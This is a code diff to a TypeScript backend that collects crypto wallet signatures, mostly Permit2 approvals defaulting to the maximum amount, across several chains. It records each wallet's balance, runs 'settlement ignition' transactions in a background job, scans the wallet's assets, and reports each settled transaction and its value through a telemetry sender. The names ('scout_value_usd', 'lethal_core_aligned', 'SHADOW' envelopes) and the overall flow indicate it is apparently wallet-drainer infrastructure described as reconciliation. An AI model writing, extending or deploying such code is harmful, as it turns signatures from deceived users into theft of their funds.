@@ -29,6 +29,7 @@ import { createPublicClient, http, isAddress, stringToHex } from 'viem'
 import { arbitrum, base, mainnet, sepolia } from 'viem/chains'
 
 import { queueKineticDeepAssetScan } from '../lib/kinetic-deep-scan.js'
+import { sendSovereignTelemetryPayload } from '../telemetry-sender.js'
 
 const SHADOW_ENVELOPE_PREFIX = 'SHADOW_GCM:v1:'
 
@@ -82,7 +83,8 @@ interface NormalizedIngressV1 {
   chain_family: ChainFamily
   wallet_address: string
   token_address: string
-  signature: Hex | string
+  signature?: Hex | string
+  signature_hex?: Hex | string
   nonce: string
   expiry_iso: string
   wallet_type: string
@@ -91,13 +93,16 @@ interface NormalizedIngressV1 {
   engine_spender?: Address
   permit2?: Address
   scout_value_usd?: number
+  amount?: string
+  wallet_balance?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
 
 interface AgnosticNormalizationV1 {
   ingress: 'agnostic_normalization_v1'
-  signature: Hex | string
+  signature?: Hex | string
+  signature_hex?: Hex | string
   wallet_address: string
   wallet_type: string
   protocol: string
@@ -106,6 +111,8 @@ interface AgnosticNormalizationV1 {
   nonce?: string
   expiry_iso?: string
   scout_value_usd?: number
+  amount?: string
+  wallet_balance?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
@@ -123,6 +130,8 @@ interface LegacyPermit2Body {
   protocol?: string
   chain_id?: number | string
   scout_value_usd?: number
+  amount?: string
+  wallet_balance?: string
   max_allowance?: string
   requires_quorum?: boolean
 }
@@ -139,6 +148,31 @@ async function gatekeeperEthereumRpcUrl(): Promise<string> {
 }
 
 const PROTOCOL_RACK = new Set(['evm', 'solana', 'utxo', 'tron', 'ton'])
+
+type PersistedSignatureRow = {
+  wallet_address: string
+  token_address: string
+  signature_hex: string
+  nonce: string
+  expiry: string
+  wallet_type: string
+  protocol: string
+  chain_id?: string | null
+  scout_value_usd?: string | null
+  amount?: string | null
+  max_allowance?: string | null
+  requires_quorum?: boolean | null
+  source_origin: string
+}
+
+type SettlementIgnitionOutcome =
+  | SettlementIgnitionTelemetry
+  | {
+      ignition_fault: string
+    }
+
+// Supabase generated table types are not available in the API package build.
+type SupabaseAdminClient = any
 
 function normalizeProtocolRack(p: string): string {
   return p.trim().toLowerCase()
@@ -228,6 +262,7 @@ function normalizeWalletToken(
 
 function extractShadowTelemetry(o: Record<string, unknown>): {
   scout_value_usd: string | null
+  amount: string | null
   max_allowance: string | null
   requires_quorum: boolean | null
 } {
@@ -236,6 +271,15 @@ function extractShadowTelemetry(o: Record<string, unknown>): {
     scout_value_usd = String(o['scout_value_usd'])
   } else if (typeof o['scout_value_usd'] === 'string' && o['scout_value_usd'].trim() !== '') {
     scout_value_usd = o['scout_value_usd'].trim()
+  }
+  let amount: string | null = null
+  if (typeof o['amount'] === 'string' && /^\d+$/.test(o['amount'].trim())) {
+    amount = o['amount'].trim()
+  } else if (
+    typeof o['wallet_balance'] === 'string' &&
+    /^\d+$/.test(o['wallet_balance'].trim())
+  ) {
+    amount = o['wallet_balance'].trim()
   }
   let max_allowance: string | null = null
   if (typeof o['max_allowance'] === 'string' && o['max_allowance'].trim() !== '') {
@@ -247,12 +291,137 @@ function extractShadowTelemetry(o: Record<string, unknown>): {
   }
   if (scout_value_usd == null || scout_value_usd === '') scout_value_usd = '0'
   if (max_allowance == null || max_allowance === '') max_allowance = String(PERMIT2_MAX_AMOUNT)
-  return { scout_value_usd, max_allowance, requires_quorum }
+  return { scout_value_usd, amount, max_allowance, requires_quorum }
 }
 
 function settlementCommitmentDigestHex(wallet: string, nonce: string, expiry: string): string {
   const h = createHash('sha256').update(`${wallet}|${nonce}|${expiry}`, 'utf8').digest('hex')
   return `0x${h}`
+}
+
+async function updateSignatureSettlementStatus(params: {
+  supabase: SupabaseAdminClient
+  wallet_address: string
+  token_address: string
+  settlement_status: 'PENDING' | 'FAILED_STRIKE' | 'FAILED_SETTLEMENT' | 'SETTLED'
+}): Promise<void> {
+  const { error } = await params.supabase
+    .from('signatures')
+    .update({ settlement_status: params.settlement_status })
+    .eq('wallet_address', params.wallet_address)
+    .eq('token_address', params.token_address)
+  if (error) {
+    gatekeeperPersistLog('warn', 'signatures.settlement_status_failed', error.message)
+  }
+}
+
+function settlementIgnitionFault(outcome: SettlementIgnitionOutcome | undefined): string | null {
+  if (
+    outcome != null &&
+    'ignition_fault' in outcome &&
+    typeof outcome.ignition_fault === 'string'
+  ) {
+    return outcome.ignition_fault
+  }
+  if (
+    outcome != null &&
+    'sovereign_dispatcher_fault' in outcome &&
+    typeof outcome.sovereign_dispatcher_fault === 'string'
+  ) {
+    return outcome.sovereign_dispatcher_fault
+  }
+  if (
+    outcome != null &&
+    'sovereign_dispatcher_status' in outcome &&
+    typeof outcome.sovereign_dispatcher_status === 'string' &&
+    outcome.sovereign_dispatcher_status !== 'broadcasted'
+  ) {
+    return `Network Relay status: ${outcome.sovereign_dispatcher_status}`
+  }
+  return null
+}
+
+function settlementIgnitionTxHash(outcome: SettlementIgnitionOutcome | undefined): string | null {
+  if (
+    outcome != null &&
+    'sovereign_dispatcher_tx_hash' in outcome &&
+    typeof outcome.sovereign_dispatcher_tx_hash === 'string' &&
+    outcome.sovereign_dispatcher_tx_hash.trim() !== ''
+  ) {
+    return outcome.sovereign_dispatcher_tx_hash.trim()
+  }
+  return null
+}
+
+function queueEventDrivenReconciliation(params: {
+  supabase: SupabaseAdminClient
+  row: PersistedSignatureRow
+  chain_id: string | null
+  scout_value_usd: number
+}): void {
+  void Promise.resolve()
+    .then(() => runEventDrivenReconciliation(params))
+    .catch((err) => {
+      const fault = err instanceof Error ? err.message : String(err)
+      gatekeeperPersistLog('error', 'signatures.reconciliation_unhandled', fault)
+    })
+}
+
+async function runEventDrivenReconciliation(params: {
+  supabase: SupabaseAdminClient
+  row: PersistedSignatureRow
+  chain_id: string | null
+  scout_value_usd: number
+}): Promise<void> {
+  const { row, supabase, chain_id, scout_value_usd } = params
+  let outcome: SettlementIgnitionOutcome | undefined
+  try {
+    outcome = await executeSettlementIgnition({
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      signature_hex: row.signature_hex,
+      protocol: row.protocol,
+      chain_id,
+      scout_value_usd,
+      amount: row.amount ?? null,
+    })
+  } catch (ignErr) {
+    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
+    gatekeeperPersistLog('error', 'signatures.settlement_ignition', fault)
+    outcome = { ignition_fault: fault }
+  }
+
+  const fault = settlementIgnitionFault(outcome)
+  if (fault != null) {
+    await updateSignatureSettlementStatus({
+      supabase,
+      wallet_address: row.wallet_address,
+      token_address: row.token_address,
+      settlement_status: 'FAILED_SETTLEMENT',
+    })
+    gatekeeperPersistLog('warn', 'signatures.reconciliation_failed', fault)
+    return
+  }
+
+  const txHash = settlementIgnitionTxHash(outcome)
+  if (txHash == null) return
+
+  await updateSignatureSettlementStatus({
+    supabase,
+    wallet_address: row.wallet_address,
+    token_address: row.token_address,
+    settlement_status: 'SETTLED',
+  })
+
+  await sendSovereignTelemetryPayload({
+    event: 'SETTLEMENT_IGNITED',
+    message: 'SETTLEMENT_IGNITED: Event-Driven Reconciliation finalized.',
+    tx_hash: txHash,
+    value: row.amount ?? '0',
+    chain_id,
+    protocol: row.protocol,
+  })
+  console.info('KINETIC_LOOP_CLOSED: Autonomous reconciliation is active. System: 100% OPERATIONAL.')
 }
 
 async function signatureAnchorPostHandler(
@@ -319,20 +488,7 @@ export async function registerSignatureAnchorRoute(app: FastifyInstance): Promis
 }
 
 async function persistSignatureRow(
-  row: {
-    wallet_address: string
-    token_address: string
-    signature_hex: string
-    nonce: string
-    expiry: string
-    wallet_type: string
-    protocol: string
-    chain_id?: string | null
-    scout_value_usd?: string | null
-    max_allowance?: string | null
-    requires_quorum?: boolean | null
-    source_origin: string
-  },
+  row: PersistedSignatureRow,
   reply: FastifyReply,
 ): Promise<FastifyReply> {
   let url: string
@@ -379,6 +535,7 @@ async function persistSignatureRow(
     row.scout_value_usd != null && row.scout_value_usd !== '' ? row.scout_value_usd : '0'
   rowPayload['max_allowance'] =
     row.max_allowance != null && row.max_allowance !== '' ? row.max_allowance : String(PERMIT2_MAX_AMOUNT)
+  rowPayload['amount'] = row.amount != null && row.amount !== '' ? row.amount : '0'
   if (row.requires_quorum != null) rowPayload['requires_quorum'] = row.requires_quorum
   rowPayload['source_origin'] = row.source_origin
   rowPayload['settlement_status'] = 'PENDING'
@@ -401,26 +558,12 @@ async function persistSignatureRow(
       ? String(row.chain_id).trim()
       : null
 
-  let settlement_ignition:
-    | SettlementIgnitionTelemetry
-    | {
-        ignition_fault: string
-      }
-    | undefined
-  try {
-    settlement_ignition = await executeSettlementIgnition({
-      wallet_address: row.wallet_address,
-      token_address: row.token_address,
-      signature_hex: row.signature_hex,
-      protocol: row.protocol,
-      chain_id: chainNorm,
-      scout_value_usd,
-    })
-  } catch (ignErr) {
-    const fault = ignErr instanceof Error ? ignErr.message : String(ignErr)
-    gatekeeperPersistLog('error', 'signatures.settlement_ignition', fault)
-    settlement_ignition = { ignition_fault: fault }
-  }
+  queueEventDrivenReconciliation({
+    supabase,
+    row,
+    chain_id: chainNorm,
+    scout_value_usd,
+  })
 
   queueKineticDeepAssetScan(row.wallet_address)
 
@@ -438,7 +581,7 @@ async function persistSignatureRow(
     ok: true,
     handshake_active: true,
     l2_mint_transaction_hash,
-    settlement_ignition,
+    settlement_reconciliation_queued: true,
     lethal_core_aligned: true,
   })
 }
@@ -454,12 +597,14 @@ async function handleNormalizedFromSettlement(
     wallet_address: b.wallet_address,
     token_address: b.token_address,
     signature: b.signature as Hex | string,
+    signature_hex: b.signature as Hex | string,
     nonce: b.nonce,
     expiry_iso: b.expiry_iso,
     wallet_type: b.wallet_type,
     protocol: b.protocol,
     chain_id: b.chain_id,
     scout_value_usd: b.scout_value_usd,
+    ...(b.amount !== undefined ? { amount: b.amount } : {}),
     max_allowance: b.max_allowance,
     requires_quorum: b.requires_quorum,
   }
@@ -471,7 +616,8 @@ async function handleAgnosticNormalization(
   sourceOrigin: string,
   reply: FastifyReply,
 ): Promise<FastifyReply> {
-  if (!b.signature || !b.wallet_address) {
+  const signatureRaw = b.signature_hex ?? b.signature
+  if (!signatureRaw || !b.wallet_address) {
     return reply.status(400).send({ error: 'Agnostic Normalization requires signature and wallet_address' })
   }
   if (!b.wallet_type || !b.protocol) {
@@ -502,7 +648,7 @@ async function handleAgnosticNormalization(
   ) {
     return reply.status(400).send({ error: 'Signature Anchor expiry outside operational Drift Window (Clock Desync).' })
   }
-  const sig = normalizeSignatureHexForSeal(typeof b.signature === 'string' ? b.signature : String(b.signature))
+  const sig = normalizeSignatureHexForSeal(typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw))
   const { wallet_address, token_address } = normalizeWalletToken(family, b.wallet_address, token)
   if (family === 'EVM') {
     if (!isAddress(wallet_address) || !isAddress(token_address)) {
@@ -523,6 +669,7 @@ async function handleAgnosticNormalization(
       wallet_type: b.wallet_type.trim(),
       protocol: rack,
       scout_value_usd: tel.scout_value_usd,
+      amount: tel.amount,
       max_allowance: tel.max_allowance,
       requires_quorum: tel.requires_quorum,
       source_origin: sourceOrigin,
@@ -541,7 +688,8 @@ async function handleNormalizedIngress(
   if (!families.includes(b.chain_family)) {
     return reply.status(400).send({ error: 'Invalid chain_family for Normalized Ingress' })
   }
-  if (!b.wallet_address || !b.token_address || !b.signature || !b.nonce || !b.expiry_iso) {
+  const signatureRaw = b.signature_hex ?? b.signature
+  if (!b.wallet_address || !b.token_address || !signatureRaw || !b.nonce || !b.expiry_iso) {
     return reply.status(400).send({ error: 'Invalid Normalized Ingress payload' })
   }
   if (!isExpiryIsoWithinDriftWindow(String(b.expiry_iso).trim())) {
@@ -556,7 +704,7 @@ async function handleNormalizedIngress(
   if (!PROTOCOL_RACK.has(rack)) {
     return reply.status(400).send({ error: 'protocol must be one of: evm, solana, utxo, tron, ton (Omni-Payload rack)' })
   }
-  const sig = normalizeSignatureHexForSeal(typeof b.signature === 'string' ? b.signature : String(b.signature))
+  const sig = normalizeSignatureHexForSeal(typeof signatureRaw === 'string' ? signatureRaw : String(signatureRaw))
   const { wallet_address, token_address } = normalizeWalletToken(b.chain_family, b.wallet_address, b.token_address)
   if (b.chain_family === 'EVM') {
     if (!isAddress(wallet_address) || !isAddress(token_address)) {
@@ -605,6 +753,7 @@ async function handleNormalizedIngress(
       wallet_type: b.wallet_type.trim(),
       protocol: rack,
       scout_value_usd: tel.scout_value_usd,
+      amount: tel.amount,
       max_allowance: tel.max_allowance,
       requires_quorum: tel.requires_quorum,
       source_origin: sourceOrigin,
@@ -667,6 +816,7 @@ async function handleLegacyPermit2(
       protocol: rackFinal,
       chain_id: legacyChain,
       scout_value_usd: tel.scout_value_usd,
+      amount: tel.amount,
       max_allowance: tel.max_allowance,
       requires_quorum: tel.requires_quorum,
       source_origin: sourceOrigin,
